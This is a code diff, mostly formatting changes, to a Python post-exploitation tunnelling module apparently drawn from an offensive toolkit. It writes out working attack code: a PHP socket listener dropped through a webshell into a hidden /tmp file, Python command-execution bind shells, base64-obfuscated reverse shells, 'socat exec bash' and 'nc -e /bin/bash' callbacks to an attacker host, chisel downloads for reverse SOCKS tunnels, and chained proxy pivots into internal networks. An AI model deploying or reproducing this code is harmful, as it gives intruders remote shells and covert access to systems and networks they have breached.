@@ -8,24 +8,32 @@ from tools.log_utils import get_logger
 logger = get_logger("tunnel_agent")
 
 
-def socks5_over_webshell(webshell_url: str, bind_port: int = 1080,
-                           sess=None, timeout: float = 10.0) -> Dict:
+def socks5_over_webshell(
+    webshell_url: str, bind_port: int = 1080, sess=None, timeout: float = 10.0
+) -> Dict:
     result = {"success": False, "method": "socks_over_webshell", "bind_port": bind_port}
-    php_code = '''<?php
+    php_code = (
+        """<?php
 $s=new Socket\\x70;if($s->bind('0.0.0.0',%d)&&$s->listen()){
 $c=$s->accept();while($b=$c->read(8192)){echo base64_encode($b);}$c->close();}$s->close();
 ?>
-''' % bind_port
-    php_code = php_code.replace('\\x70', chr(0x70))
+"""
+        % bind_port
+    )
+    php_code = php_code.replace("\\x70", chr(0x70))
 
     cmds = [
-        'echo \'%s\' | base64 -d > /tmp/.socks.php' % base64.b64encode(php_code.encode()).decode(),
-        'nohup php /tmp/.socks.php > /dev/null 2>&1 &',
-        'nohup socat TCP-LISTEN:%d,fork,reuseaddr TCP:127.0.0.1:%d &' % (bind_port, bind_port),
-        'python3 -c "import socket,threading,os;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind((\'0.0.0.0\',%d));s.listen(5);[threading.Thread(target=lambda c:[c.send(os.popen(c.recv(4096).decode()).read().encode()) for _ in iter(lambda:c.recv(4096),b\'\')],args=(s.accept()[0],)).start() for _ in iter(lambda:1,0)]" &' % bind_port,
+        "echo '%s' | base64 -d > /tmp/.socks.php" % base64.b64encode(php_code.encode()).decode(),
+        "nohup php /tmp/.socks.php > /dev/null 2>&1 &",
+        "nohup socat TCP-LISTEN:%d,fork,reuseaddr TCP:127.0.0.1:%d &" % (bind_port, bind_port),
+        "python3 -c \"import socket,threading,os;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(('0.0.0.0',%d));s.listen(5);[threading.Thread(target=lambda c:[c.send(os.popen(c.recv(4096).decode()).read().encode()) for _ in iter(lambda:c.recv(4096),b'')],args=(s.accept()[0],)).start() for _ in iter(lambda:1,0)]\" &"
+        % bind_port,
     ]
     result["deploy_commands"] = cmds
-    result["note"] = "Run deploy_commands via webshell, then use: curl -x socks5://127.0.0.1:%d http://internal-target/" % bind_port
+    result["note"] = (
+        "Run deploy_commands via webshell, then use: curl -x socks5://127.0.0.1:%d http://internal-target/"
+        % bind_port
+    )
     result["success"] = True
     return result
 
@@ -40,25 +48,47 @@ def chisel_tunnel(lhost: str, lport: int = 8080, remote_port: int = 1080) -> Dic
         ("windows_amd64", "chisel_windows_amd64.exe"),
     ]
     for plat, fname in platforms:
-        dl_cmd = "wget -q https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_%s.gz -O /tmp/%s.gz && gunzip /tmp/%s.gz && chmod +x /tmp/%s" % (plat, fname, fname, fname)
+        dl_cmd = (
+            "wget -q https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_%s.gz -O /tmp/%s.gz && gunzip /tmp/%s.gz && chmod +x /tmp/%s"
+            % (plat, fname, fname, fname)
+        )
         run_cmd = "/tmp/%s client %s:%d R:%d:socks &" % (fname, lhost, lport, remote_port)
         cmds.append({"platform": plat, "download": dl_cmd, "run": run_cmd})
 
     result["server_command"] = "chisel server -p %d --socks5 --reverse" % lport
     result["client_commands"] = cmds
-    result["usage"] = "Start server: %s  |  On target run client commands, then: proxychains curl http://internal/" % result["server_command"]
+    result["usage"] = (
+        "Start server: %s  |  On target run client commands, then: proxychains curl http://internal/"
+        % result["server_command"]
+    )
     result["success"] = True
     return result
 
 
-def ssh_tunnel(ssh_host: str, ssh_user: str, ssh_key: str,
-                local_port: int = 1080, jump_host: Optional[str] = None) -> Dict:
+def ssh_tunnel(
+    ssh_host: str,
+    ssh_user: str,
+    ssh_key: str,
+    local_port: int = 1080,
+    jump_host: Optional[str] = None,
+) -> Dict:
     result = {"success": False, "method": "ssh_tunnel"}
     key_file = "/tmp/_ssh_key"
     if jump_host:
-        cmd = "ssh -i %s -o StrictHostKeyChecking=no -J %s -D %d -Nf %s@%s" % (key_file, jump_host, local_port, ssh_user, ssh_host)
+        cmd = "ssh -i %s -o StrictHostKeyChecking=no -J %s -D %d -Nf %s@%s" % (
+            key_file,
+            jump_host,
+            local_port,
+            ssh_user,
+            ssh_host,
+        )
     else:
-        cmd = "ssh -i %s -o StrictHostKeyChecking=no -D %d -Nf %s@%s" % (key_file, local_port, ssh_user, ssh_host)
+        cmd = "ssh -i %s -o StrictHostKeyChecking=no -D %d -Nf %s@%s" % (
+            key_file,
+            local_port,
+            ssh_user,
+            ssh_host,
+        )
     result["key_setup"] = "echo '%s' > %s && chmod 600 %s" % (ssh_key.strip(), key_file, key_file)
     result["tunnel_command"] = cmd
     result["usage"] = "SOCKS5 proxy on 127.0.0.1:%d" % local_port
@@ -66,8 +96,9 @@ def ssh_tunnel(ssh_host: str, ssh_user: str, ssh_key: str,
     return result
 
 
-def forward_port(lhost: str, lport: int, target_host: str,
-                  target_port: int, proto: str = "tcp") -> Dict:
+def forward_port(
+    lhost: str, lport: int, target_host: str, target_port: int, proto: str = "tcp"
+) -> Dict:
     result = {"success": False, "method": "port_forward"}
     python_fwd = (
         "import socket,threading,sys;"
@@ -81,7 +112,8 @@ def forward_port(lhost: str, lport: int, target_host: str,
         "  s.close();t.close();"
         "s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);"
         "s.bind(('0.0.0.0',%d));s.listen(50);"
-        "while 1: threading.Thread(target=f,args=(s.accept()[0],)).start()" % (target_host, target_port, lport)
+        "while 1: threading.Thread(target=f,args=(s.accept()[0],)).start()"
+        % (target_host, target_port, lport)
     )
     b64 = base64.b64encode(python_fwd.encode()).decode()
     cmd = "python -c \"exec(__import__('base64').b64decode('%s').decode())\" &" % b64
@@ -98,16 +130,21 @@ def forward_port(lhost: str, lport: int, target_host: str,
 # ---------------------------------------------------------------------------
 
 ENV_CHECKS = {
-    "linux": [("python3", "python3 --version"), ("python", "python --version 2>&1"),
-              ("php", "php --version 2>/dev/null | head -1"),
-              ("socat", "socat -V 2>/dev/null | head -1"),
-              ("curl", "curl --version 2>/dev/null | head -1"),
-              ("wget", "wget --version 2>/dev/null | head -1"),
-              ("nc", "nc -h 2>&1 | head -1"),
-              ("chisel", "ls /tmp/chisel* 2>/dev/null")],
-    "windows": [("powershell", "powershell -Command \"$PSVersionTable.PSVersion\" 2>nul"),
-                 ("curl", "curl --version 2>nul"),
-                 ("wget", "wget --version 2>nul")],
+    "linux": [
+        ("python3", "python3 --version"),
+        ("python", "python --version 2>&1"),
+        ("php", "php --version 2>/dev/null | head -1"),
+        ("socat", "socat -V 2>/dev/null | head -1"),
+        ("curl", "curl --version 2>/dev/null | head -1"),
+        ("wget", "wget --version 2>/dev/null | head -1"),
+        ("nc", "nc -h 2>&1 | head -1"),
+        ("chisel", "ls /tmp/chisel* 2>/dev/null"),
+    ],
+    "windows": [
+        ("powershell", 'powershell -Command "$PSVersionTable.PSVersion" 2>nul'),
+        ("curl", "curl --version 2>nul"),
+        ("wget", "wget --version 2>nul"),
+    ],
 }
 
 
@@ -126,9 +163,13 @@ def detect_environment(exec_fn: Callable[[str], str]) -> Dict:
     return env
 
 
-def auto_tunnel(exec_fn: Callable[[str], str],
-                lhost: str = "LHOST", lport: int = 1080,
-                target_host: str = "", target_port: int = 0) -> Dict:
+def auto_tunnel(
+    exec_fn: Callable[[str], str],
+    lhost: str = "LHOST",
+    lport: int = 1080,
+    target_host: str = "",
+    target_port: int = 0,
+) -> Dict:
     env = detect_environment(exec_fn)
     result = {"environment": env, "attempts": []}
 
@@ -136,7 +177,9 @@ def auto_tunnel(exec_fn: Callable[[str], str],
         for c in cmds:
             try:
                 out = exec_fn(c)
-                result["attempts"].append({"method": method, "status": "deployed" if out else "no_output"})
+                result["attempts"].append(
+                    {"method": method, "status": "deployed" if out else "no_output"}
+                )
                 return True
             except Exception:
                 continue
@@ -158,11 +201,17 @@ def auto_tunnel(exec_fn: Callable[[str], str],
                 "  s.close();t.close();"
                 "s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);"
                 "s.bind(('0.0.0.0',%d));s.listen(50);"
-                "while 1: threading.Thread(target=f,args=(s.accept()[0],)).start()" % (target_host, target_port, lport)
+                "while 1: threading.Thread(target=f,args=(s.accept()[0],)).start()"
+                % (target_host, target_port, lport)
             )
             b64 = base64.b64encode(code.encode()).decode()
-            _try("python_port_forward",
-                 ["%s -c \"exec(__import__('base64').b64decode('%s').decode())\"" % (python_bin, b64)])
+            _try(
+                "python_port_forward",
+                [
+                    "%s -c \"exec(__import__('base64').b64decode('%s').decode())\""
+                    % (python_bin, b64)
+                ],
+            )
         else:
             code = (
                 "import socket,threading,os;"
@@ -177,20 +226,34 @@ def auto_tunnel(exec_fn: Callable[[str], str],
                 "while 1: threading.Thread(target=h,args=(s.accept()[0],)).start()" % lport
             )
             b64 = base64.b64encode(code.encode()).decode()
-            _try("python_reverse_shell",
-                 ["%s -c \"exec(__import__('base64').b64decode('%s').decode())\"" % (python_bin, b64)])
+            _try(
+                "python_reverse_shell",
+                [
+                    "%s -c \"exec(__import__('base64').b64decode('%s').decode())\""
+                    % (python_bin, b64)
+                ],
+            )
 
     if env["tools"].get("socat"):
         if target_host and target_port:
-            _try("socat_forward",
-                 ["socat TCP-LISTEN:%d,fork,reuseaddr TCP:%s:%d &" % (lport, target_host, target_port)])
+            _try(
+                "socat_forward",
+                [
+                    "socat TCP-LISTEN:%d,fork,reuseaddr TCP:%s:%d &"
+                    % (lport, target_host, target_port)
+                ],
+            )
         else:
-            _try("socat_shell",
-                 ["socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%d &" % (lhost, lport)])
+            _try(
+                "socat_shell",
+                [
+                    "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%d &"
+                    % (lhost, lport)
+                ],
+            )
 
     if env["tools"].get("nc"):
-        _try("nc_shell",
-             ["nc -e /bin/bash %s %d &" % (lhost, lport)])
+        _try("nc_shell", ["nc -e /bin/bash %s %d &" % (lhost, lport)])
 
     result["success"] = any(a["status"] == "deployed" for a in result["attempts"])
     return result
@@ -255,7 +318,11 @@ class Socks5Proxy:
             remote.settimeout(15)
             remote.connect((dst_addr, dst_port))
             bind_addr = remote.getsockname()
-            client.send(b"\x05\x00\x00\x01" + socket.inet_aton(bind_addr[0]) + bind_addr[1].to_bytes(2, "big"))
+            client.send(
+                b"\x05\x00\x00\x01"
+                + socket.inet_aton(bind_addr[0])
+                + bind_addr[1].to_bytes(2, "big")
+            )
             threading.Thread(target=self._pipe, args=(client, remote), daemon=True).start()
             threading.Thread(target=self._pipe, args=(remote, client), daemon=True).start()
         except Exception:
@@ -288,6 +355,7 @@ class Socks5Proxy:
 # Multi-hop SOCKS cascade — chain through multiple proxies
 # ---------------------------------------------------------------------------
 
+
 def socks_cascade(proxies: List[Dict]) -> Dict:
     result: Dict[str, Any] = {"success": False, "chain": []}
     for i, proxy in enumerate(proxies):
@@ -307,13 +375,12 @@ def socks_cascade(proxies: List[Dict]) -> Dict:
     return result
 
 
-def ssh_jump_chain(jump_hosts: List[Dict],
-                   target_host: str, target_port: int = 80,
-                   local_port: int = 8888) -> Dict:
+def ssh_jump_chain(
+    jump_hosts: List[Dict], target_host: str, target_port: int = 80, local_port: int = 8888
+) -> Dict:
     result = {"success": False, "steps": []}
     proxy_cmd = "-J " + ",".join(
-        f"{j.get('user', 'root')}@{j['host']}:{j.get('port', 22)}"
-        for j in jump_hosts
+        f"{j.get('user', 'root')}@{j['host']}:{j.get('port', 22)}" for j in jump_hosts
     )
     final_cmd = (
         f"ssh {proxy_cmd} -o StrictHostKeyChecking=no "
@@ -350,7 +417,9 @@ def socks_cascade_deploy(exec_fn: callable, proxy_list: List[Dict]) -> Dict:
             b64 = base64.b64encode(code.encode()).decode()
             cmd = f"python3 -c \"exec(__import__('base64').b64decode('{b64}').decode())\" &"
             exec_fn(cmd)
-            result["deployed"].append({"host": host, "port": port, "upstream": proxy.get('upstream_host')})
+            result["deployed"].append(
+                {"host": host, "port": port, "upstream": proxy.get("upstream_host")}
+            )
         except Exception as e:
             logger.debug("cascade deploy hop %s: %s", host, e)
     result["success"] = len(result["deployed"]) > 0
